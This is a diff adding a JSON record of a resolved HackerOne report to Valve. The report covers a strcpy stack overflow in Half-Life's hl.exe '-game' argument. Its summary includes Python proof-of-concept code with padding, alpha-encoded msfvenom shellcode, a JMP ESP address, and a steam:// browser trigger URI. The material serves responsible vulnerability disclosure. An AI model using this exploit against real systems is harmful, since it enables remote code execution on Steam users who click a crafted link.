@@ -1,0 +1,158 @@
+{
+  "id": 832750,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzI3NTA=",
+  "url": "https://hackerone.com/reports/832750",
+  "title": "Buffer overflow In hl.exe's launch -game argument allows an attacker to execute arbitrary code locally or from browser",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-27T13:07:35.475Z",
+  "submitted_at": "2020-03-27T13:07:35.475Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "irukandjisecresearch",
+    "url": "/irukandjisecresearch",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23363,
+    "url": "https://hackerone.com/valve",
+    "handle": "valve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Valve",
+      "twitter_handle": "",
+      "website": "https://www.valvesoftware.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-08-19T03:20:04.881Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-12T03:37:35.352Z",
+  "team_member_agreed_on_going_public_at": "2020-08-19T03:20:04.735Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "weakness": {
+    "id": 4,
+    "name": "Stack Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 55,
+  "voters": [
+    "hexpwn",
+    "s3asarv3sh",
+    "gamer7112",
+    "mvc",
+    "spam404",
+    "thalaivar304",
+    "b911bade858ce8e6a0f50f8",
+    "aryan2808",
+    "romesful",
+    "fe7ch",
+    "and 45 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 1289,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "hl.exe",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 24088,
+      "category": "team",
+      "content": "Half Life 1 allows users to set various launch arguments when running the game from the command line, one of them is \"**-game**\" which specifies the game/mod to be launched. [Documented here](https://developer.valvesoftware.com/wiki/Command_Line_Options#Command-line_parameters_2)\n\n```\nhl.exe -game <argument>\n```\n\nThe contents of this argument is copied via a call to strcpy() onto the stack without any size checking, this results in adjacent memory being overwritten including the stored return address.\n\nThis can be tested by parsing an overly long argument to **hl.exe -game <argument>** and easily viewed in **Immunity Debugger** by opening hl.exe and setting the arguments field to -game <overly long input> as seen below.\n{F762911}\n\nI believe this routine in WinMain() is the root cause, specifically the strcpy() call.\n{F762804}\n\n\n**An attacker can demonstrably use this to hijack program control flow and execute arbitrary code on the target system, as you can see here EIP is controlled.**\n{F762809}\n\n**Control flow being hijacked after return address is overwritten and function returns**\n{F762846}\n**Beginning of shellcode execution**\n{F762842}\nThis memory corruption can be triggered through Steam's URI handler which allows a browser to launch steam games and specify arguments.\n\n```python\npayload = \"A\"*524\npayload += \"B\"*4\n\nprint payload\n\n'''\nEither run from command line/in debugger using hl.exe -game <payload> or use the payload in the browser POC below\n'''\n\n```\n\nThe exploit below is not quite working because the shellcode won't execute in it's entirety, however the first few instructions get executed demonstrating arbitrary code execution. \n\n```python\nimport struct\n\n#msfvenom -p windows/exec CMD=calc.exe BufferRegister=ESP --platform windows -a x86 -e x86/alpha_upper\nshellcode = \"TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLZHMRUPC0C03PLIM56Q9PBDLK606PLK0R4LLK0R24LKT2VH4ONW1Z7V6QKONLWL513L32VLQ09QXO4MEQ8GJBJRF2PWLK62TPLK1ZWLLKPL4Q48JC0H318Q0QLK0Y7PC1ICLK0ITXZCGJW9LK04LKUQN6FQKONLIQ8ODM319W08M0D5ZV5SSMKHWKSMFDRUZD68LKF814UQYC2FLKTLPKLKQHELS1YCLKC4LK318PMYW4Q47TQK1K51PYQJPQKOKP1O1OPZLK4RJKLM1MCZC1LMK5OBEP5P5PPPBHVQLKROK7KO8UOKZPOE920VSXY6MEOMMMKOYE7LS63LTJK0KKKP3E35OKG75C42ROCZS01CKOYE3SCQBLRC6NRE482E5PAA\"\n\npayload = \"A\"*524\npayload += struct.pack(\"<L\",0x757d6537) #JMP ESP will differ \npayload += shellcode\n\nprint payload\n\n```\nBrowser POC:\n```\nsteam://rungameid/70//-game <payload output> \n```\n\nDue to Half Life's command line argument parsing, the entire payload has to comprise of ASCII printable characters, as a result I could not use a JMP ESP gadget from the binary or any loaded process specific DLLs, instead I had to use a gadget address in an OS module which was protected by ASLR. \n\nHowever, being a 32bit process means the ASLR entropy on this gadget is relatively low and a successful attack could be executed on AT WORST 1/256 victims.\n\nOlder versions of Windows that don't employ ASLR on various OS .dlls would theoretically guarantee a near 100% successful exploitation rate. \n\n**Test Machine**\n```\nOS Name:                   Microsoft Windows 10 Pro\nOS Version:                10.0.18362 N/A Build 18362\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Standalone Workstation\nOS Build Type:             Multiprocessor Free\nProcessor(s):              1 Processor(s) Installed.\n                           [01]: AMD64 Family 23 Model 1 Stepping 1 AuthenticAMD ~3000 Mhz\n\nHotfix(s):                 12 Hotfix(s) Installed.\n                           [01]: KB4537572\n                           [02]: KB4515383\n                           [03]: KB4516115\n                           [04]: KB4521863\n                           [05]: KB4524244\n                           [06]: KB4524569\n                           [07]: KB4528759\n                           [08]: KB4537759\n                           [09]: KB4538674\n                           [10]: KB4541338\n                           [11]: KB4501374\n                           [12]: KB4551762\n\n```\n\n## Impact\n\nAn attacker could use this vulnerability to gain remote code execution on the host machine of a victim who clicked on a malicious link as long as they have Steam and Half Life installed.\n\nAccording to SteamSpy this could affect as many as ten million users.\n[Link to Half Life Stats](https://steamspy.com/app/70)",
+      "updated_at": "2020-08-19T03:19:19.629Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 279011,
+        "username": "mikela",
+        "name": "Mike L",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2018-05-17T22:06:50.780Z",
+        "url": "https://hackerone.com/mikela",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
